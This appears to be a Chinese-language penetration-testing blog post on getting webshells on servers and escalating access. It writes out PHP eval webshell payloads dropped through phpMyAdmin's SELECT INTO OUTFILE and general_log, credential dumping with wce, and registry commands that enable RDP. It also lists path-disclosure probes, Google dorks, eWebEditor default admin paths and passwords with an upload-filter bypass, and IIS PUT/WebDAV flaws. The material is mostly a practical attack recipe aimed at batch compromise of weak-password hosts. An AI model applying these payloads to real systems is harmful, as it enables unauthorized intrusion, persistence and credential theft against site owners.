<h3 id="phpMyAdmin"><a href="#phpMyAdmin" class="headerlink" title="phpMyAdmin"></a>phpMyAdmin</h3><p>是一个以PHP为基础，以Web-Bas方式架构在网站主机上的MySQL的数据库管理工具，让管理者可用Web接口管理MySQL数据库。</p>
<p>主要是弱口令批量拿shell</p>
<p><a href="https://xz.aliyun.com/t/3283" target="_blank" rel="noopener">phpadmin 弱口令空密码getshell 常见姿势</a></p>
<h4 id="拿shell"><a href="#拿shell" class="headerlink" title="拿shell"></a>拿shell</h4><p>简单总结一下：</p>
<h5 id="1、select-into-outfile写shell（但是要知道网站的绝对路径），select-basedir-mysql的绝对路径。【低于5-0？】"><a href="#1、select-into-outfile写shell（但是要知道网站的绝对路径），select-basedir-mysql的绝对路径。【低于5-0？】" class="headerlink" title="1、select into outfile写shell（但是要知道网站的绝对路径），select @@basedir mysql的绝对路径。【低于5.0？】"></a>1、select into outfile写shell（但是要知道网站的绝对路径），select @@basedir mysql的绝对路径。【低于5.0？】</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select load_file(&#39;C:&#x2F;wamp64&#x2F;www&#x2F;ma.php&#39;)</span><br><span class="line">select &#39;&lt;?php eval($_POST[cmd]); ?&gt;&#39; into outfile &#39;C:&#x2F;wamp64&#x2F;www&#x2F;ma.php&#39;;</span><br></pre></td></tr></table></figure>

<p><strong>但是：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SHOW VARIABLES LIKE &quot;secure_file_priv&quot;;</span><br></pre></td></tr></table></figure>

<p>如果值为文件夹目录，则只允许修改目录下的文件，如果值为<code>NULL</code>则为禁止。<br><strong>并且这个值是只读变量，只能通过配置文件修改。</strong></p>
<h5 id="2、利用日志写shell（mysql-gt-5-0）"><a href="#2、利用日志写shell（mysql-gt-5-0）" class="headerlink" title="2、利用日志写shell（mysql&gt;=5.0）"></a>2、利用日志写shell（mysql&gt;=5.0）</h5><p>mysql5.0会创建日志</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set global general_log &#x3D; &quot;ON&quot;;</span><br><span class="line">set global general_log_file&#x3D;&#39;C:&#x2F;wamp64&#x2F;www&#x2F;ma.php&#39;;</span><br><span class="line">select &#39;&lt;?php eval($_POST[cmd]);?&gt;&#39;;</span><br></pre></td></tr></table></figure>

<p>但是如果服务器上MYSQL并没有被赋予在站点根目录下创建文件的权限，也无法写入shell</p>
<p>并且解析。</p>
<h4 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h4><h5 id="3、获取管理员密码"><a href="#3、获取管理员密码" class="headerlink" title="3、获取管理员密码"></a>3、获取管理员密码</h5><p>1、wce抓取</p>
<p>管理员启动的mysql服务那么getshell直接就是管理员权限，如果是其他用户则需要提权。<br>wce，pwdump，mimikatz等工具都能抓取密码。上传wce.exe</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wce -w 明文</span><br><span class="line">wce -l 密文</span><br></pre></td></tr></table></figure>

<p>拿到hash值后就可以用<strong>hashcat</strong>或者直接跑<strong>彩虹表</strong>来获取密码。在线也有<a href="https://www.objectif-securite.ch/en/ophcrack.php" target="_blank" rel="noopener">ophcrack</a>可以破解。</p>
<p>2、3389连接</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">REG ADD <span class="string">"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server"</span> /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br><span class="line">REG ADD <span class="string">"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"</span> /v PortNumber /t REG_DWORD /d 0x00000d3d /f</span><br></pre></td></tr></table></figure>

<p>Windows7这类非服务器的系统上远程登录的话会挤掉当前用户，用户掉线马上就知道出事了。当然也可以使用工具让其支持多用户登录</p>
<h5 id="4、php爆绝对路径"><a href="#4、php爆绝对路径" class="headerlink" title="4、php爆绝对路径"></a>4、php爆绝对路径</h5><p><strong>单引号爆路径</strong></p>
<p>直接在URL后面加单引号，要求单引号没有被过滤(gpc=off)且服务器默认返回错误信息。<br><code>www.xxx.com/news.php?id=1′</code></p>
<p><strong>错误参数值爆路径</strong></p>
<p>将要提交的参数值改成错误值，比如-1。-99999单引号被过滤时不妨试试。<br><code>www.xxx.com/researcharchive.php?id=-1</code></p>
<p><strong>Google爆路径</strong></p>
<p>结合关键字和site语法搜索出错页面的网页快照，常见关键字有warning和fatal error。注意，如果目标站点是二级域名，site接的是其对应的顶级域名，这样得到的信息要多得多。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Site:xxx.edu.tw warning</span><br><span class="line">Site:xxx.com.tw “fatal error”</span><br></pre></td></tr></table></figure>

<p><strong>测试文件爆路径</strong></p>
<p>很多网站的根目录下都存在测试文件，脚本代码通常都是phpinfo()。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www.xxx.com&#x2F;test.php</span><br><span class="line">www.xxx.com&#x2F;ceshi.php</span><br><span class="line">www.xxx.com&#x2F;info.php</span><br><span class="line">www.xxx.com&#x2F;phpinfo.php</span><br><span class="line">www.xxx.com&#x2F;php_info.php</span><br><span class="line">www.xxx.com&#x2F;1.php</span><br></pre></td></tr></table></figure>

<p><strong>phpmyadmin爆路径</strong></p>
<p>一旦找到phpmyadmin的管理页面，再访问该目录下的某些特定文件，就很有可能爆出物理路径。至于phpmyadmin的地址可以用wwwscan这类的工具去扫，也可以选择google。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;phpmyadmin&#x2F;libraries&#x2F;lect_lang.lib.php</span><br><span class="line">&#x2F;phpMyAdmin&#x2F;index.php?lang[]&#x3D;1</span><br><span class="line">&#x2F;phpMyAdmin&#x2F;phpinfo.php</span><br><span class="line">load_file()</span><br><span class="line">&#x2F;phpmyadmin&#x2F;themes&#x2F;darkblue_orange&#x2F;layout.inc.php</span><br><span class="line">&#x2F;phpmyadmin&#x2F;libraries&#x2F;select_lang.lib.php</span><br><span class="line">&#x2F;phpmyadmin&#x2F;libraries&#x2F;lect_lang.lib.php</span><br><span class="line">&#x2F;phpmyadmin&#x2F;libraries&#x2F;mcrypt.lib.php</span><br></pre></td></tr></table></figure>

<p><strong>配置文件找路径</strong></p>
<p>如果注入点有文件读取权限，就可以手工load_file或工具读取配置文件，再从中寻找路径信息（一般在文件末尾）。各平台下Web服务器和PHP的配置文件默认路径可以上网查，这里列举常见的几个。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Windows:</span><br><span class="line">c:\windows\php.ini php配置文件</span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xml IIS虚拟主机配置文件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Linux:</span><br><span class="line">&#x2F;etc&#x2F;php.ini php配置文件</span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;conf.d&#x2F;php.conf</span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf Apache配置文件</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;apache&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;apache2&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;apache&#x2F;conf&#x2F;extra&#x2F;httpd-vhosts.conf 虚拟目录配置文件</span><br></pre></td></tr></table></figure>

<p><strong>nginx文件类型错误解析爆路径</strong></p>
<p>说明：<br>要求Web服务器是nginx，且存在文件类型解析漏洞。有时在图片地址后加/x.php，该图片不但会被当作php文件执行，有可能爆出物理路径<br><code>www.xxx.com/xx.jpg/x.php</code></p>
<h2 id="web渗透框架（N种漏洞经验）"><a href="#web渗透框架（N种漏洞经验）" class="headerlink" title="web渗透框架（N种漏洞经验）"></a>web渗透框架（N种漏洞经验）</h2><p><img src="/2020/11/07/web%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/web%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/.%5Cimage-20201109135815926.png" alt="image-20201109135815926"></p>
<p><img src="/2020/11/07/web%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/web%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/.%5Cimage-20201109142446318.png" alt="image-20201109142446318"></p>
<p><img src="/2020/11/07/web%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/web%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/.%5Cimage-20201109154946299.png" alt="image-20201109154946299"></p>
<h2 id="比较常见的编辑器漏洞"><a href="#比较常见的编辑器漏洞" class="headerlink" title="比较常见的编辑器漏洞"></a>比较常见的编辑器漏洞</h2><p>eWebEditor基于浏览器的在线HTML编辑器</p>
<p>ewebeditornet</p>
<p>fckeditornet</p>
<p>editor</p>
<p>southideditor</p>
<p>SouthidcEditor</p>
<p>bigcneditor</p>
<h3 id="编辑器默认的后台登录"><a href="#编辑器默认的后台登录" class="headerlink" title="编辑器默认的后台登录"></a>编辑器默认的后台登录</h3><p>Editor/admin/asp/upload.asp<br> Editor/admin_login.asp<br> ewebeditor/admin_login.asp<br> admin/Editor/admin_login.asp<br> admin/ewebeditor/admin_login.asp</p>
<h4 id="1、关键文件的名称和路径"><a href="#1、关键文件的名称和路径" class="headerlink" title="1、关键文件的名称和路径"></a>1、关键文件的名称和路径</h4><p>Admin_Login.asp 登录页面<br>Admin_Default.asp 管理首页<br>Admin_Style.asp<br>Admin_UploadFile.asp<br>Upload.asp<br>Admin_ModiPwd.asp<br>eWebEditor.asp<br>db/ewebeditor.mdb 默认数据库路径 默认用户名admin，密码admin，admin888</p>
<p><img src="/2020/11/07/web%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/web%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/.%5Cimage-20201109173624058.png" alt="image-20201109173624058"></p>
<p>注：添加图片类型这里，会出错，如果直接是asp|aspx|cer 上传文件会出错，也不能解析，要上传aaspsp|aspx|cer ,这样就可以解析</p>
<p>添加工具栏——按钮设置——添加或者修改图片</p>
<h4 id="2、ewebeditor编辑器一般默认数据库路径是db-ewebeditor-mdb"><a href="#2、ewebeditor编辑器一般默认数据库路径是db-ewebeditor-mdb" class="headerlink" title="2、ewebeditor编辑器一般默认数据库路径是db/ewebeditor.mdb"></a>2、ewebeditor编辑器一般默认数据库路径是db/ewebeditor.mdb</h4><p>默认的后台路径是admin_login.asp<br>建议最好检测下admin_style.asp文件是否可以直接访问</p>
<h2 id="IIS-put漏洞拿shell"><a href="#IIS-put漏洞拿shell" class="headerlink" title="IIS put漏洞拿shell"></a>IIS put漏洞拿shell</h2><p>1、查看options包，获取允许的权限</p>
<p>2、put文件</p>
<p>3、修改文件名（用mov或者是copy改成sap后缀）</p>
<p>IS 6.0 PUT上传漏洞。产生原因是IIS Server在Web服务扩展中开启了WebDAV。并且管理员在配置权限时，没有遵循最小原则。给IIS配置了可以写入的权限，包括网站根目录。</p>
<p>总结一下IIS的漏洞：<br>1、PUT漏洞（6.0webdav）</p>
<p>2、远程代码执行(CVE-2017-7269) （6.0webdav）</p>
<p>3、解析漏洞（6.0-7.5）【在<code>.asp</code>目录下的任意文件会以<code>asp</code>格式解析】</p>
<p>4、短文件名爆破【主要是为兼容16位ms-dos，较长文件名或者文件夹生成windows8.3短文件名。HTTP请求中旧DOS 8.3名称约定的代字符（<del>），由于短文件名的长度固定（xxxxxx</del>xxxx），~后面的数字递增】</p>
<p><a href="https://xz.aliyun.com/t/6783" target="_blank" rel="noopener">iis漏洞总结</a></p>
<p><a href="https://www.jianshu.com/p/4380e5719ed6" target="_blank" rel="noopener">iis短文件名泄露</a></p>
]]></content>
  </entry>
</search>
